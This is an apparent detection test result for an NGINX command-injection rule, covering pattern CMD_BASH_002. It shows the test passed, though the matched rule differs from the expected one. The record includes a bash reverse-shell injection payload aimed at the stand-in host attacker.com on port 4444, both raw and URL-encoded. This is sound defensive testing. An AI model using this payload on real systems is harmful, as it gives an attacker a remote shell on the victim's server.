name: test_e2e_with_logs[270_CMD_BASH_002]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASH_002` |
| **Name** | Bash reverse shell |
| **Category** | CMDI |
| **Subcategory** | bash_specific |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `&& bash -i >& /dev/tcp/attacker.com/4444 0>&1`
- **Encoded**: `%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~12000ms
- **Timestamp**: 12:09:46.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Basic command injection` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_002-1769861386911-b0zqp pattern_id=CMD_BASH_002 uri=/?q=%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261 client=127.0.0.1` |
| **Rule Match** | ❌ Mismatch |
